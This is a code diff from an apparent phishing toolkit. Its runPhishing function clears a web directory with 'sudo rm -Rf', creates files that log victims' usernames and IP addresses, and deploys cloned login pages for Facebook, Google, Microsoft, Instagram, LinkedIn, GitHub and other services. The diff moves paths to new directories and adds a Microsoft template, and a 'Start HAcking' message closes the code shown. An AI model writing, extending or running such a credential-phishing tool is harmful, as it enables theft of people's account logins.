@@ -70,44 +70,46 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('rm -Rf ServerTermux/www/*.* && touch ServerTermux/www/usernames.txt && touch ServerTermux/www/iplog.txt')
+    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt && cp WebPages/base.php Server/www/')
     if option2 == '1' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_standard/*.* ServerTermux/www/')
+        copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_advanced_poll/*.* ServerTermux/www/')  
+        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")  
     if option2 == '3' and social == 'Facebook':
-        system('cp WebPagesTermux/mobile_fb/*.* ServerTermux/www/')   
+        copy_tree("WebPages/mobile_fb/", "Server/www/")   
     if option2 == '4' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_security_fake/*.* ServerTermux/www/')  
+        copy_tree("WebPages/fb_security_fake/", "Server/www/")  
     if option2 == '5' and social == 'Facebook':
-        system('cp WebPagesTermux/fb_messenger/*.* ServerTermux/www/')         
+        copy_tree("WebPages/fb_messenger/", "Server/www/")         
     elif option2 == '1' and social == 'Google':
-        system('cp WebPagesTermux/google_standard/*.* ServerTermux/www/')
+        copy_tree("WebPages/google_standard/", "Server/www/")
     elif option2 == '2' and social == 'Google':
-        system('cp WebPagesTermux/google_advanced_poll/*.* ServerTermux/www/')
+        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
     elif option2 == '3' and social == 'Google':
-        system('cp WebPagesTermux/google_advanced_web/*.* ServerTermux/www/')	
+        copy_tree("WebPages/google_advanced_web/", "Server/www/")   
     elif social == 'LinkedIn':
-        system('cp WebPagesTermux/linkedin/*.* ServerTermux/www/')
+        copy_tree("WebPages/linkedin/", "Server/www/")
     elif social == 'GitHub':
-        system('cp WebPagesTermux/GitHub/*.* ServerTermux/www/')
+        copy_tree("WebPages/GitHub/", "Server/www/")
     elif social == 'StackOverflow':
-        system('cp WebPagesTermux/stackoverflow/*.* ServerTermux/www/')
+        copy_tree("WebPages/stackoverflow/", "Server/www/")
     elif social == 'WordPress':
-        system('cp WebPagesTermux/wordpress/*.* ServerTermux/www/')
+        copy_tree("WebPages/wordpress/", "Server/www/")
     elif social == 'Twitter':
-        system('cp WebPagesTermux/twitter/*.* ServerTermux/www/')
+        copy_tree("WebPages/twitter/", "Server/www/")
     elif social == 'Snapchat':
-        system('cp WebPagesTermux/Snapchat_web/*.* ServerTermux/www/')
+        copy_tree("WebPages/Snapchat_web/", "Server/www/")
     elif social == 'Yahoo':
-        system('cp WebPagesTermux/yahoo_web/*.* ServerTermux/www/')
+        copy_tree("WebPages/yahoo_web/", "Server/www/")
     elif social == 'Twitch':
-        system('cp WebPagesTermux/twitch/*.* ServerTermux/www/')        	
+        copy_tree("WebPages/twitch/", "Server/www/")
+    elif social == 'Microsoft':
+        copy_tree("WebPages/live_web/", "Server/www/")	
     elif option2 == '1' and social == 'Instagram':
-        system('cp WebPagesTermux/Instagram_web/*.* ServerTermux/www/')
+        copy_tree("WebPages/Instagram_web/", "Server/www/")    
     elif option2 == '2' and social == 'Instagram':
-        system('cp WebPagesTermux/Instagram_autoliker/*.* ServerTermux/www/')
-        
+        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
+
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.... Start HAcking ".format(RED, END) 
   
